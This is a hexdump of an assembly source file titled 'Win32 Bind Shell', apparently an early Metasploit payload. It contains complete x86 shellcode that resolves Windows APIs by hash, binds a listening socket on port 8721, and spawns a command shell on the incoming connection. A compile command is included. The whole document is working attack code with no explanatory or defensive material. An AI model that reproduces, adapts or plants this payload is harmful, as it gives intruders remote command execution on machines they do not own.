00000000  3b 20 20 20 20 20 20 54  69 74 6c 65 3a 20 20 57  |;      Title:  W|
00000010  69 6e 33 32 20 42 69 6e  64 20 53 68 65 6c 6c 0d  |in32 Bind Shell.|
00000020  0a 3b 20 20 50 6c 61 74  66 6f 72 6d 73 3a 20 20  |.;  Platforms:  |
00000030  57 69 6e 64 6f 77 73 20  4e 54 20 34 2e 30 2c 20  |Windows NT 4.0, |
00000040  57 69 6e 64 6f 77 73 20  32 30 30 30 2c 20 57 69  |Windows 2000, Wi|
00000050  6e 64 6f 77 73 20 58 50  2c 20 57 69 6e 64 6f 77  |ndows XP, Window|
00000060  73 20 32 30 30 33 0d 0a  3b 20 20 20 46 75 6e 63  |s 2003..;   Func|
00000070  74 69 6f 6e 3a 20 20 4c  69 73 74 65 6e 20 66 6f  |tion:  Listen fo|
00000080  72 20 63 6f 6e 6e 65 63  74 69 6f 6e 20 61 6e 64  |r connection and|
00000090  20 73 70 61 77 6e 20 63  6f 6d 6d 61 6e 64 20 73  | spawn command s|
000000a0  68 65 6c 6c 0d 0a 3b 20  20 20 20 20 41 75 74 68  |hell..;     Auth|
000000b0  6f 72 3a 20 20 68 64 6d  5b 61 74 5d 6d 65 74 61  |or:  hdm[at]meta|
000000c0  73 70 6c 6f 69 74 2e 63  6f 6d 0d 0a 0d 0a 3b 20  |sploit.com....; |
000000d0  43 6f 6d 70 69 6c 65 3a  20 6e 61 73 6d 20 2d 66  |Compile: nasm -f|
000000e0  20 62 69 6e 20 2d 6f 20  77 69 6e 33 32 5f 62 69  | bin -o win32_bi|
000000f0  6e 64 2e 62 69 6e 20 77  69 6e 33 32 5f 62 69 6e  |nd.bin win32_bin|
00000100  64 2e 61 73 6d 0d 0a 0d  0a 0d 0a 5b 42 49 54 53  |d.asm......[BITS|
00000110  20 33 32 5d 0d 0a 0d 0a  67 6c 6f 62 61 6c 20 5f  | 32]....global _|
00000120  73 74 61 72 74 0d 0a 0d  0a 5f 73 74 61 72 74 3a  |start...._start:|
00000130  0d 0a 0d 0a 4c 43 61 6c  6c 65 72 3a 0d 0a 20 20  |....LCaller:..  |
00000140  20 20 63 61 6c 6c 20 4c  4c 6f 61 64 46 75 6e 63  |  call LLoadFunc|
00000150  74 69 6f 6e 73 0d 0a 0d  0a 4c 44 61 74 61 53 65  |tions....LDataSe|
00000160  67 6d 65 6e 74 3a 0d 0a  3b 3d 3d 3d 3d 3d 3d 3d  |gment:..;=======|
00000170  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
00000180  3d 0d 0a 0d 0a 64 64 20  22 43 4d 44 22 0d 0a 0d  |=....dd "CMD"...|
00000190  0a 64 64 20 30 78 37 39  63 36 37 39 65 37 20 3b  |.dd 0x79c679e7 ;|
000001a0  20 63 6c 6f 73 65 73 6f  63 6b 65 74 20 20 20 20  | closesocket    |
000001b0  20 20 20 20 20 20 20 20  20 31 32 0d 0a 64 64 20  |         12..dd |
000001c0  30 78 34 39 38 36 34 39  65 35 20 3b 20 61 63 63  |0x498649e5 ; acc|
000001d0  65 70 74 20 20 20 20 20  20 20 20 20 20 20 20 20  |ept             |
000001e0  20 20 20 20 20 31 36 0d  0a 64 64 20 30 78 65 39  |     16..dd 0xe9|
000001f0  32 65 61 64 61 34 20 3b  20 6c 69 73 74 65 6e 20  |2eada4 ; listen |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000210  20 32 30 0d 0a 64 64 20  30 78 63 37 37 30 31 61  | 20..dd 0xc7701a|
00000220  61 34 20 3b 20 62 69 6e  64 20 20 20 20 20 20 20  |a4 ; bind       |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 32 34 0d  |             24.|
00000240  0a 64 64 20 30 78 61 64  66 35 30 39 64 39 20 3b  |.dd 0xadf509d9 ;|
00000250  20 57 53 41 53 6f 63 6b  65 74 41 20 20 20 20 20  | WSASocketA     |
00000260  20 20 20 20 20 20 20 20  20 32 38 0d 0a 64 64 20  |         28..dd |
00000270  30 78 33 62 66 63 65 64  63 62 20 3b 20 57 53 41  |0x3bfcedcb ; WSA|
00000280  53 74 61 72 74 75 70 20  20 20 20 20 20 20 20 20  |Startup         |
00000290  20 20 20 20 20 33 32 0d  0a 0d 0a 64 64 20 30 78  |     32....dd 0x|
000002a0  65 63 30 65 34 65 38 65  20 3b 20 4c 6f 61 64 4c  |ec0e4e8e ; LoadL|
000002b0  69 62 72 61 72 79 41 20  20 20 20 20 20 20 20 20  |ibraryA         |
000002c0  20 20 20 33 36 0d 0a 64  64 20 30 78 37 33 65 32  |   36..dd 0x73e2|
000002d0  64 38 37 65 20 3b 20 45  78 69 74 50 72 6f 63 65  |d87e ; ExitProce|
000002e0  73 73 20 20 20 20 20 20  20 20 20 20 20 20 20 34  |ss             4|
000002f0  30 0d 0a 64 64 20 30 78  63 65 30 35 64 39 61 64  |0..dd 0xce05d9ad|
00000300  20 3b 20 57 61 69 74 46  6f 72 53 69 6e 67 6c 65  | ; WaitForSingle|
00000310  4f 62 6a 65 63 74 20 20  20 20 20 34 34 0d 0a 64  |Object     44..d|
00000320  64 20 30 78 31 36 62 33  66 65 37 32 20 3b 20 43  |d 0x16b3fe72 ; C|
00000330  72 65 61 74 65 50 72 6f  63 65 73 73 41 20 20 20  |reateProcessA   |
00000340  20 20 20 20 20 20 20 34  38 0d 0a 0d 0a 64 62 20  |       48....db |
00000350  22 57 53 32 5f 33 32 2e  44 4c 4c 22 2c 20 30 78  |"WS2_32.DLL", 0x|
00000360  30 30 2c 20 30 78 30 31  0d 0a 3b 3d 3d 3d 3d 3d  |00, 0x01..;=====|
00000370  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
00000380  3d 3d 3d 0d 0a 0d 0a 4c  4c 6f 61 64 46 75 6e 63  |===....LLoadFunc|
00000390  74 69 6f 6e 73 3a 09 0d  0a 20 20 20 20 70 6f 70  |tions:...    pop|
000003a0  20 65 62 78 20 20 0d 0a  20 20 20 20 70 75 73 68  | ebx  ..    push|
000003b0  20 65 73 70 0d 0a 09 6d  6f 76 20 65 62 70 2c 20  | esp...mov ebp, |
000003c0  65 73 70 20 0d 0a 20 20  20 20 6d 6f 76 20 5b 65  |esp ..    mov [e|
000003d0  62 70 5d 2c 20 65 62 78  0d 0a 0d 0a 4c 4b 65 72  |bp], ebx....LKer|
000003e0  6e 65 6c 33 32 42 61 73  65 3a 0d 0a 20 20 20 20  |nel32Base:..    |
000003f0  70 75 73 68 20 62 79 74  65 20 30 78 33 30 0d 0a  |push byte 0x30..|
00000400  20 20 20 20 70 6f 70 20  65 63 78 0d 0a 20 20 20  |    pop ecx..   |
00000410  20 6d 6f 76 20 65 61 78  2c 20 5b 66 73 3a 65 63  | mov eax, [fs:ec|
00000420  78 5d 0d 0a 09 6d 6f 76  20 65 61 78 2c 20 5b 65  |x]...mov eax, [e|
00000430  61 78 20 2b 20 30 78 30  63 5d 20 0d 0a 09 6d 6f  |ax + 0x0c] ...mo|
00000440  76 20 65 73 69 2c 20 5b  65 61 78 20 2b 20 30 78  |v esi, [eax + 0x|
00000450  31 63 5d 20 0d 0a 09 6c  6f 64 73 64 09 09 09 09  |1c] ...lodsd....|
00000460  20 20 0d 0a 09 6d 6f 76  20 65 62 78 2c 20 5b 65  |  ...mov ebx, [e|
00000470  61 78 20 2b 20 30 78 30  38 5d 20 0d 0a 20 20 20  |ax + 0x08] ..   |
00000480  20 6a 6d 70 20 73 68 6f  72 74 20 4c 53 74 61 72  | jmp short LStar|
00000490  74 4c 6f 61 64 69 6e 67  0d 0a 0d 0a 4c 4c 6f 61  |tLoading....LLoa|
000004a0  64 57 69 6e 73 6f 63 6b  3a 0d 0a 20 20 20 20 6c  |dWinsock:..    l|
000004b0  65 61 20 65 64 78 2c 20  5b 65 64 69 20 2b 20 34  |ea edx, [edi + 4|
000004c0  34 5d 20 3b 20 67 65 74  20 61 64 64 72 65 73 73  |4] ; get address|
000004d0  20 6f 66 20 77 73 32 5f  33 32 2e 64 6c 6c 0d 0a  | of ws2_32.dll..|
000004e0  20 20 20 20 70 75 73 68  20 65 63 78 20 20 20 20  |    push ecx    |
000004f0  20 20 20 20 20 20 20 20  3b 20 73 61 76 65 20 63  |        ; save c|
00000500  6f 75 6e 74 65 72 0d 0a  20 20 20 20 70 75 73 68  |ounter..    push|
00000510  20 65 64 78 20 20 20 20  20 20 20 20 20 20 20 20  | edx            |
00000520  3b 20 70 75 73 68 20 61  64 64 72 65 73 73 20 6f  |; push address o|
00000530  66 20 77 73 32 5f 33 32  2e 64 6c 6c 0d 0a 09 63  |f ws2_32.dll...c|
00000540  61 6c 6c 20 65 61 78 20  20 20 20 20 20 20 20 20  |all eax         |
00000550  20 20 20 3b 20 4c 6f 61  64 4c 69 62 72 61 72 79  |   ; LoadLibrary|
00000560  41 28 29 0d 0a 20 20 20  20 6d 6f 76 20 65 62 78  |A()..    mov ebx|
00000570  2c 20 65 61 78 20 20 20  20 20 20 20 20 3b 20 73  |, eax        ; s|
00000580  61 76 65 20 6d 6f 64 75  6c 65 20 68 61 6e 64 6c  |ave module handl|
00000590  65 20 0d 0a 20 20 20 20  70 6f 70 20 65 63 78 20  |e ..    pop ecx |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 72 65  |            ; re|
000005b0  73 74 6f 72 65 20 63 6f  75 6e 74 65 72 0d 0a 20  |store counter.. |
000005c0  20 20 20 6a 6d 70 20 73  68 6f 72 74 20 4c 6f 6f  |   jmp short Loo|
000005d0  70 65 72 32 0d 0a 20 20  20 20 0d 0a 4c 53 74 61  |per2..    ..LSta|
000005e0  72 74 4c 6f 61 64 69 6e  67 3a 0d 0a 20 20 20 20  |rtLoading:..    |
000005f0  3b 20 53 74 61 72 74 20  6c 6f 61 64 69 6e 67 20  |; Start loading |
00000600  61 64 64 72 65 73 73 65  73 20 61 74 20 65 62 70  |addresses at ebp|
00000610  20 2b 20 31 32 0d 0a 20  20 20 20 70 75 73 68 20  | + 12..    push |
00000620  62 79 74 65 20 30 78 30  38 0d 0a 20 20 20 20 70  |byte 0x08..    p|
00000630  6f 70 20 65 73 69 0d 0a  20 20 20 20 61 64 64 20  |op esi..    add |
00000640  65 73 69 2c 20 65 62 70  20 0d 0a 0d 0a 20 20 20  |esi, ebp ....   |
00000650  20 3b 20 46 75 6e 63 74  69 6f 6e 20 63 6f 75 6e  | ; Function coun|
00000660  74 65 72 0d 0a 20 20 20  20 70 75 73 68 20 62 79  |ter..    push by|
00000670  74 65 20 30 78 30 61 0d  0a 20 20 20 20 70 6f 70  |te 0x0a..    pop|
00000680  20 65 63 78 0d 0a 20 20  20 20 6d 6f 76 20 65 64  | ecx..    mov ed|
00000690  69 2c 20 5b 65 62 70 5d  0d 0a 20 20 20 20 0d 0a  |i, [ebp]..    ..|
000006a0  4c 6f 6f 70 65 72 3a 0d  0a 20 20 20 20 63 6d 70  |Looper:..    cmp|
000006b0  20 63 6c 2c 20 30 78 30  36 0d 0a 20 20 20 20 6a  | cl, 0x06..    j|
000006c0  65 20 73 68 6f 72 74 20  4c 4c 6f 61 64 57 69 6e  |e short LLoadWin|
000006d0  73 6f 63 6b 0d 0a 0d 0a  4c 6f 6f 70 65 72 32 3a  |sock....Looper2:|
000006e0  20 20 20 20 0d 0a 20 20  20 20 70 75 73 68 20 65  |    ..    push e|
000006f0  63 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |cx              |
00000700  20 20 20 20 20 20 3b 20  73 61 76 65 20 74 68 65  |      ; save the|
00000710  20 63 6f 75 6e 74 65 72  0d 0a 20 20 20 20 70 75  | counter..    pu|
00000720  73 68 20 65 62 78 20 20  20 20 20 20 20 20 20 20  |sh ebx          |
00000730  20 20 20 20 20 20 20 20  20 20 3b 20 64 6c 6c 20  |          ; dll |
00000740  68 61 6e 64 6c 65 0d 0a  20 20 20 20 70 75 73 68  |handle..    push|
00000750  20 64 77 6f 72 64 20 5b  65 64 69 20 2b 20 65 63  | dword [edi + ec|
00000760  78 2a 34 5d 20 20 20 20  3b 20 66 75 6e 63 74 69  |x*4]    ; functi|
00000770  6f 6e 20 68 61 73 68 20  76 61 6c 75 65 0d 0a 20  |on hash value.. |
00000780  20 20 20 63 61 6c 6c 20  4c 47 65 74 50 72 6f 63  |   call LGetProc|
00000790  41 64 64 72 65 73 73 20  20 20 20 20 20 20 20 3b  |Address        ;|
000007a0  20 66 69 6e 64 20 74 68  65 20 61 64 64 72 65 73  | find the addres|
000007b0  73 0d 0a 20 20 20 20 70  6f 70 20 65 63 78 20 20  |s..    pop ecx  |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007d0  20 20 20 3b 20 72 65 73  74 6f 72 65 20 74 68 65  |   ; restore the|
000007e0  20 63 6f 75 6e 74 65 72  0d 0a 20 20 20 20 6d 6f  | counter..    mo|
000007f0  76 20 5b 65 73 69 20 2b  20 65 63 78 20 2a 20 34  |v [esi + ecx * 4|
00000800  5d 2c 20 65 61 78 20 20  20 20 3b 20 73 74 61 63  |], eax    ; stac|
00000810  6b 20 73 65 67 6d 65 6e  74 20 74 6f 20 73 74 6f  |k segment to sto|
00000820  72 65 20 61 64 64 72 65  73 73 65 73 0d 0a 20 20  |re addresses..  |
00000830  20 20 6c 6f 6f 70 20 4c  6f 6f 70 65 72 0d 0a 09  |  loop Looper...|
00000840  78 6f 72 20 65 64 69 2c  20 65 64 69 0d 0a 0d 0a  |xor edi, edi....|
00000850  4c 57 53 41 53 74 61 72  74 75 70 3a 0d 0a 09 3b  |LWSAStartup:...;|
00000860  20 57 53 41 53 74 61 72  74 75 70 28 30 78 31 30  | WSAStartup(0x10|
00000870  31 2c 20 44 41 54 41 29  20 0d 0a 20 20 20 20 73  |1, DATA) ..    s|
00000880  75 62 20 73 70 2c 20 34  30 30 0d 0a 09 70 75 73  |ub sp, 400...pus|
00000890  68 20 65 73 70 0d 0a 09  70 75 73 68 20 30 78 31  |h esp...push 0x1|
000008a0  30 31 0d 0a 09 63 61 6c  6c 20 5b 65 62 70 20 2b  |01...call [ebp +|
000008b0  20 33 32 5d 0d 0a 0d 0a  4c 57 53 41 53 6f 63 6b  | 32]....LWSASock|
000008c0  65 74 41 3a 0d 0a 09 3b  20 57 53 41 53 6f 63 6b  |etA:...; WSASock|
000008d0  65 74 41 28 32 2c 31 2c  30 2c 30 2c 30 2c 30 29  |etA(2,1,0,0,0,0)|
000008e0  20 0d 0a 09 70 75 73 68  20 65 64 69 0d 0a 09 70  | ...push edi...p|
000008f0  75 73 68 20 65 64 69 0d  0a 09 70 75 73 68 20 65  |ush edi...push e|
00000900  64 69 0d 0a 09 70 75 73  68 20 65 64 69 0d 0a 09  |di...push edi...|
00000910  69 6e 63 20 65 64 69 0d  0a 09 70 75 73 68 20 65  |inc edi...push e|
00000920  64 69 0d 0a 09 69 6e 63  20 65 64 69 0d 0a 09 70  |di...inc edi...p|
00000930  75 73 68 20 65 64 69 0d  0a 09 63 61 6c 6c 20 5b  |ush edi...call [|
00000940  65 62 70 20 2b 20 32 38  5d 0d 0a 09 6d 6f 76 20  |ebp + 28]...mov |
00000950  65 62 78 2c 20 65 61 78  20 20 20 20 20 20 20 20  |ebx, eax        |
00000960  20 20 20 20 20 20 20 20  3b 20 73 61 76 65 20 73  |        ; save s|
00000970  6f 63 6b 65 74 20 74 6f  20 65 62 78 0d 0a 20 20  |ocket to ebx..  |
00000980  20 20 78 6f 72 20 65 64  69 2c 20 65 64 69 0d 0a  |  xor edi, edi..|
00000990  20 20 20 20 0d 0a 4c 42  69 6e 64 3a 0d 0a 09 70  |    ..LBind:...p|
000009a0  75 73 68 20 65 64 69 0d  0a 09 70 75 73 68 20 65  |ush edi...push e|
000009b0  64 69 0d 0a 09 70 75 73  68 20 64 77 6f 72 64 20  |di...push dword |
000009c0  30 78 31 31 32 32 30 30  30 32 20 3b 20 70 6f 72  |0x11220002 ; por|
000009d0  74 20 38 37 32 31 0d 0a  09 6d 6f 76 20 65 73 69  |t 8721...mov esi|
000009e0  2c 20 65 73 70 0d 0a 09  70 75 73 68 20 62 79 74  |, esp...push byt|
000009f0  65 20 30 78 31 30 20 20  20 20 20 20 20 20 3b 20  |e 0x10        ; |
00000a00  6c 65 6e 67 74 68 0d 0a  09 70 75 73 68 20 65 73  |length...push es|
00000a10  69 0d 0a 09 70 75 73 68  20 65 62 78 0d 0a 09 63  |i...push ebx...c|
00000a20  61 6c 6c 20 5b 65 62 70  20 2b 20 32 34 5d 0d 0a  |all [ebp + 24]..|
00000a30  0d 0a 4c 4c 69 73 74 65  6e 3a 0d 0a 09 70 75 73  |..LListen:...pus|
00000a40  68 20 65 64 69 0d 0a 09  70 75 73 68 20 65 62 78  |h edi...push ebx|
00000a50  0d 0a 09 63 61 6c 6c 20  5b 65 62 70 20 2b 20 32  |...call [ebp + 2|
00000a60  30 5d 0d 0a 0d 0a 4c 41  63 63 65 70 74 3a 0d 0a  |0]....LAccept:..|
00000a70  09 70 75 73 68 20 65 64  69 0d 0a 09 70 75 73 68  |.push edi...push|
00000a80  20 65 73 69 0d 0a 09 70  75 73 68 20 65 62 78 0d  | esi...push ebx.|
00000a90  0a 09 63 61 6c 6c 20 5b  65 62 70 20 2b 20 31 36  |..call [ebp + 16|
00000aa0  5d 0d 0a 09 6d 6f 76 20  65 64 78 2c 20 65 61 78  |]...mov edx, eax|
00000ab0  0d 0a 0d 0a 4c 43 72 65  61 74 65 50 72 6f 63 65  |....LCreateProce|
00000ac0  73 73 53 74 72 75 63 74  73 3a 0d 0a 09 3b 20 61  |ssStructs:...; a|
00000ad0  6c 6c 6f 63 61 74 65 20  73 70 61 63 65 20 66 6f  |llocate space fo|
00000ae0  72 20 53 54 41 52 54 55  50 49 4e 46 4f 2c 20 50  |r STARTUPINFO, P|
00000af0  52 4f 43 45 53 53 5f 49  4e 46 4f 52 4d 41 54 49  |ROCESS_INFORMATI|
00000b00  4f 4e 20 0d 0a 09 73 75  62 20 73 70 2c 20 30 78  |ON ...sub sp, 0x|
00000b10  35 34 0d 0a 0d 0a 09 3b  20 7a 65 72 6f 20 6f 75  |54.....; zero ou|
00000b20  74 20 53 49 2f 50 49 20  0d 0a 09 6c 65 61 20 65  |t SI/PI ...lea e|
00000b30  64 69 2c 20 5b 65 73 70  5d 0d 0a 09 78 6f 72 20  |di, [esp]...xor |
00000b40  65 61 78 2c 20 65 61 78  0d 0a 20 20 20 20 70 75  |eax, eax..    pu|
00000b50  73 68 20 62 79 74 65 20  32 31 0d 0a 20 20 20 20  |sh byte 21..    |
00000b60  70 6f 70 20 65 63 78 0d  0a 20 20 20 20 0d 0a 4c  |pop ecx..    ..L|
00000b70  42 5a 65 72 6f 3a 0d 0a  09 72 65 70 20 73 74 6f  |BZero:...rep sto|
00000b80  73 64 0d 0a 20 20 20 20  0d 0a 20 20 20 20 6d 6f  |sd..    ..    mo|
00000b90  76 20 65 64 69 2c 20 65  64 78 0d 0a 09 6d 6f 76  |v edi, edx...mov|
00000ba0  20 62 79 74 65 20 5b 65  73 70 20 2b 20 31 36 5d  | byte [esp + 16]|
00000bb0  2c 20 36 38 09 20 3b 20  73 69 2e 63 62 20 3d 20  |, 68. ; si.cb = |
00000bc0  73 69 7a 65 6f 66 28 73  69 29 20 0d 0a 09 69 6e  |sizeof(si) ...in|
00000bd0  63 20 62 79 74 65 20 5b  65 73 70 20 2b 20 36 31  |c byte [esp + 61|
00000be0  5d 09 09 20 3b 20 73 69  2e 64 77 46 6c 61 67 73  |].. ; si.dwFlags|
00000bf0  20 3d 20 30 78 31 30 30  20 0d 0a 0d 0a 09 3b 20  | = 0x100 .....; |
00000c00  73 6f 63 6b 65 74 20 68  61 6e 64 6c 65 73 20 0d  |socket handles .|
00000c10  0a 09 6d 6f 76 20 5b 65  73 70 20 2b 20 31 36 20  |..mov [esp + 16 |
00000c20  2b 20 35 36 5d 2c 20 65  64 69 0d 0a 09 6d 6f 76  |+ 56], edi...mov|
00000c30  20 5b 65 73 70 20 2b 20  31 36 20 2b 20 36 30 5d  | [esp + 16 + 60]|
00000c40  2c 20 65 64 69 0d 0a 09  6d 6f 76 20 5b 65 73 70  |, edi...mov [esp|
00000c50  20 2b 20 31 36 20 2b 20  36 34 5d 2c 20 65 64 69  | + 16 + 64], edi|
00000c60  0d 0a 0d 0a 09 6c 65 61  20 65 61 78 2c 20 5b 65  |.....lea eax, [e|
00000c70  73 70 20 2b 20 31 36 5d  09 3b 20 73 69 20 0d 0a  |sp + 16].; si ..|
00000c80  09 70 75 73 68 20 65 73  70 09 09 09 3b 20 70 69  |.push esp...; pi|
00000c90  20 0d 0a 09 70 75 73 68  20 65 61 78 0d 0a 09 70  | ...push eax...p|
00000ca0  75 73 68 20 65 63 78 0d  0a 09 70 75 73 68 20 65  |ush ecx...push e|
00000cb0  63 78 0d 0a 09 70 75 73  68 20 65 63 78 0d 0a 20  |cx...push ecx.. |
00000cc0  20 20 20 0d 0a 20 20 20  20 69 6e 63 20 65 63 78  |   ..    inc ecx|
00000cd0  0d 0a 09 70 75 73 68 20  65 63 78 0d 0a 20 20 20  |...push ecx..   |
00000ce0  20 64 65 63 20 65 63 78  0d 0a 20 20 20 20 0d 0a  | dec ecx..    ..|
00000cf0  09 70 75 73 68 20 65 63  78 0d 0a 09 70 75 73 68  |.push ecx...push|
00000d00  20 65 63 78 0d 0a 09 70  75 73 68 20 64 77 6f 72  | ecx...push dwor|
00000d10  64 20 5b 65 62 70 5d 0d  0a 09 70 75 73 68 20 65  |d [ebp]...push e|
00000d20  63 78 0d 0a 0d 0a 4c 43  72 65 61 74 65 50 72 6f  |cx....LCreatePro|
00000d30  63 65 73 73 3a 0d 0a 09  63 61 6c 6c 20 5b 65 62  |cess:...call [eb|
00000d40  70 20 2b 20 34 38 5d 0d  0a 09 6d 6f 76 20 65 63  |p + 48]...mov ec|
00000d50  78 2c 20 65 73 70 0d 0a  20 20 20 20 0d 0a 4c 57  |x, esp..    ..LW|
00000d60  61 69 74 46 6f 72 53 69  6e 67 6c 65 4f 62 6a 65  |aitForSingleObje|
00000d70  63 74 3a 0d 0a 20 20 20  20 70 75 73 68 20 30 78  |ct:..    push 0x|
00000d80  46 46 46 46 46 46 46 46  0d 0a 20 20 20 20 70 75  |FFFFFFFF..    pu|
00000d90  73 68 20 64 77 6f 72 64  20 5b 65 63 78 5d 0d 0a  |sh dword [ecx]..|
00000da0  20 20 20 20 63 61 6c 6c  20 5b 65 62 70 20 2b 20  |    call [ebp + |
00000db0  34 34 5d 0d 0a 0d 0a 4c  43 6c 6f 73 65 53 6f 63  |44]....LCloseSoc|
00000dc0  6b 65 74 3a 0d 0a 20 20  20 20 70 75 73 68 20 65  |ket:..    push e|
00000dd0  64 69 0d 0a 20 20 20 20  63 61 6c 6c 20 5b 65 62  |di..    call [eb|
00000de0  70 20 2b 20 31 32 5d 0d  0a 0d 0a 4c 46 69 6e 69  |p + 12]....LFini|
00000df0  73 68 65 64 3a 0d 0a 20  20 20 20 63 61 6c 6c 20  |shed:..    call |
00000e00  5b 65 62 70 20 2b 20 34  30 5d 0d 0a 20 20 0d 0a  |[ebp + 40]..  ..|
00000e10  4c 47 65 74 50 72 6f 63  41 64 64 72 65 73 73 3a  |LGetProcAddress:|
00000e20  0d 0a 09 70 75 73 68 20  65 62 78 0d 0a 09 70 75  |...push ebx...pu|
00000e30  73 68 20 65 62 70 0d 0a  09 70 75 73 68 20 65 73  |sh ebp...push es|
00000e40  69 0d 0a 09 70 75 73 68  20 65 64 69 0d 0a 09 6d  |i...push edi...m|
00000e50  6f 76 20 65 62 70 2c 20  5b 65 73 70 20 2b 20 32  |ov ebp, [esp + 2|
00000e60  34 5d 09 09 09 0d 0a 09  6d 6f 76 20 65 61 78 2c  |4]......mov eax,|
00000e70  20 5b 65 62 70 20 2b 20  30 78 33 63 5d 09 09 0d  | [ebp + 0x3c]...|
00000e80  0a 09 6d 6f 76 20 65 64  78 2c 20 5b 65 62 70 20  |..mov edx, [ebp |
00000e90  2b 20 65 61 78 20 2b 20  31 32 30 5d 0d 0a 09 61  |+ eax + 120]...a|
00000ea0  64 64 20 65 64 78 2c 20  65 62 70 09 09 09 09 0d  |dd edx, ebp.....|
00000eb0  0a 09 6d 6f 76 20 65 63  78 2c 20 5b 65 64 78 20  |..mov ecx, [edx |
00000ec0  2b 20 32 34 5d 09 09 09  0d 0a 09 6d 6f 76 20 65  |+ 24]......mov e|
00000ed0  62 78 2c 20 5b 65 64 78  20 2b 20 33 32 5d 0d 0a  |bx, [edx + 32]..|
00000ee0  09 61 64 64 20 65 62 78  2c 20 65 62 70 0d 0a 0d  |.add ebx, ebp...|
00000ef0  0a 4c 46 6e 6c 70 3a 0d  0a 0d 0a 09 6a 65 63 78  |.LFnlp:.....jecx|
00000f00  7a 09 4c 4e 74 66 6e 64  0d 0a 09 64 65 63 20 65  |z.LNtfnd...dec e|
00000f10  63 78 0d 0a 09 6d 6f 76  20 65 73 69 2c 20 5b 65  |cx...mov esi, [e|
00000f20  62 78 20 2b 20 65 63 78  20 2a 20 34 5d 0d 0a 09  |bx + ecx * 4]...|
00000f30  61 64 64 20 65 73 69 2c  20 65 62 70 09 09 09 09  |add esi, ebp....|
00000f40  0d 0a 09 78 6f 72 20 65  64 69 2c 20 65 64 69 0d  |...xor edi, edi.|
00000f50  0a 09 63 6c 64 0d 0a 0d  0a 4c 48 73 68 6c 70 3a  |..cld....LHshlp:|
00000f60  0d 0a 0d 0a 09 78 6f 72  20 65 61 78 2c 20 65 61  |.....xor eax, ea|
00000f70  78 0d 0a 09 6c 6f 64 73  62 0d 0a 09 63 6d 70 20  |x...lodsb...cmp |
00000f80  61 6c 2c 20 61 68 0d 0a  09 6a 65 20 4c 46 6e 64  |al, ah...je LFnd|
00000f90  0d 0a 09 72 6f 72 20 65  64 69 2c 20 31 33 0d 0a  |...ror edi, 13..|
00000fa0  09 61 64 64 20 65 64 69  2c 20 65 61 78 0d 0a 09  |.add edi, eax...|
00000fb0  6a 6d 70 20 73 68 6f 72  74 20 4c 48 73 68 6c 70  |jmp short LHshlp|
00000fc0  0d 0a 0d 0a 4c 46 6e 64  3a 0d 0a 09 0d 0a 09 63  |....LFnd:......c|
00000fd0  6d 70 20 65 64 69 2c 20  5b 65 73 70 20 2b 20 32  |mp edi, [esp + 2|
00000fe0  30 5d 0d 0a 09 6a 6e 7a  20 4c 46 6e 6c 70 0d 0a  |0]...jnz LFnlp..|
00000ff0  09 6d 6f 76 20 65 62 78  2c 20 5b 65 64 78 20 2b  |.mov ebx, [edx +|
00001000  20 33 36 5d 09 09 09 0d  0a 09 61 64 64 20 65 62  | 36]......add eb|
00001010  78 2c 20 65 62 70 0d 0a  09 6d 6f 76 20 63 78 2c  |x, ebp...mov cx,|
00001020  20 5b 65 62 78 20 2b 20  32 20 2a 20 65 63 78 5d  | [ebx + 2 * ecx]|
00001030  09 09 0d 0a 09 6d 6f 76  20 65 62 78 2c 20 5b 65  |.....mov ebx, [e|
00001040  64 78 20 2b 20 32 38 5d  09 09 09 0d 0a 09 61 64  |dx + 28]......ad|
00001050  64 20 65 62 78 2c 20 65  62 70 0d 0a 09 6d 6f 76  |d ebx, ebp...mov|
00001060  20 65 61 78 2c 20 5b 65  62 78 20 2b 20 34 20 2a  | eax, [ebx + 4 *|
00001070  20 65 63 78 5d 09 0d 0a  09 61 64 64 20 65 61 78  | ecx]....add eax|
00001080  2c 20 65 62 70 0d 0a 09  6a 6d 70 20 73 68 6f 72  |, ebp...jmp shor|
00001090  74 20 4c 44 6f 6e 65 0d  0a 0d 0a 4c 4e 74 66 6e  |t LDone....LNtfn|
000010a0  64 3a 0d 0a 09 78 6f 72  20 65 61 78 2c 20 65 61  |d:...xor eax, ea|
000010b0  78 0d 0a 0d 0a 4c 44 6f  6e 65 3a 0d 0a 09 6d 6f  |x....LDone:...mo|
000010c0  76 20 65 64 78 2c 20 65  62 70 0d 0a 09 70 6f 70  |v edx, ebp...pop|
000010d0  20 65 64 69 0d 0a 09 70  6f 70 20 65 73 69 0d 0a  | edi...pop esi..|
000010e0  09 70 6f 70 20 65 62 70  0d 0a 09 70 6f 70 20 65  |.pop ebp...pop e|
000010f0  62 78 0d 0a 09 72 65 74  20 38                    |bx...ret 8|
000010fa
